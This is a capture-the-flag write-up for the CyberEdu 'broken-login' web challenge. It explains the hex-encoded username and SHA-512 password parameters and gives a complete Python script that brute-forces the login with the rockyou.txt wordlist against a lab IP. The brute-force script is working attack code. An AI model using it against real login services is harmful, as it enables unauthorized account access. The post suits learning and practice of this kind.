+++
date = '2026-01-10'
draft = false
title = 'CyberEdu broken-login Writeup'
ShowToc = true
tags = ["CyberEdu", "web"]
+++

## Challenge overview

Intern season is up again and our new intern Alex had to do a simple login page. Not only the login page is not working properly, it is also highly insecure...

---

## Identifying the vulnerabilities

This is how our POST requests are sent.

![challenge-screenshot](pic1.png#center) 

Then, another GET is made: `GET /auth?username=67616761&password=9748ae63d43e39bb35e3060fbde9f34c731d4173f8b579441404bed6f485644335fca004f512c6602f77549e0aa5e23fec9a8b3979d61a73b9eb414ee9a27ca6`.

That's a sha512 hash. I'm thinking, why don't we try rockyou.txt? We can just sha512 each entry, send it, and see if we get a response with a content length higher than 0. That failed though. 

I tried a couple other things but they didn't work, so I looked online for a solution. Turns out, my intuition was correct. But I missed one thing.

![challenge-screenshot](pic2.png#center) 

Apparently the *bug* was that our parameter was supposed to be *name*, not *username*. Great. Trying with `?name=416c6578` (Alex in hex, since that's how the parameters are passed), we get an *Invalid password* error, finally. We can resume our initial idea and run the script again.

And here it is:

```python
import hashlib
import requests

URL = "http://34.89.163.72:31083/auth"
USERNAME = "416c6578"   # "Alex" in hex
WORDLIST = "/usr/share/wordlists/rockyou.txt"

session = requests.Session()
i = 0

def sha512_hex(s):
    return hashlib.sha512(s.encode()).hexdigest()

with open(WORDLIST, errors="ignore") as f:
    for password in f:
        password = password.strip()
        hashed = sha512_hex(password)
        
        if i % 1000 == 0:
    	    print("Trying:", password)
    	    
    	    
        r = session.get(
            URL,
            params={
                "name": USERNAME,
                "password": hashed
            },
            timeout=5
        )
        
        i=i+1

        if "Invalid password" not in r.text:
            print("\n[+] VALID PASSWORD FOUND")
            print("Password:", password)
            print("Hash:", hashed)
            print("Response length:", len(r.content))
            print("Response:\n", r.text)
            break

```

And here is our flag:

![challenge-screenshot](flag.png#center) 

I guess there's a lesson to be learned here, which is read everything thrice.

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/brokenlogin.py)**.




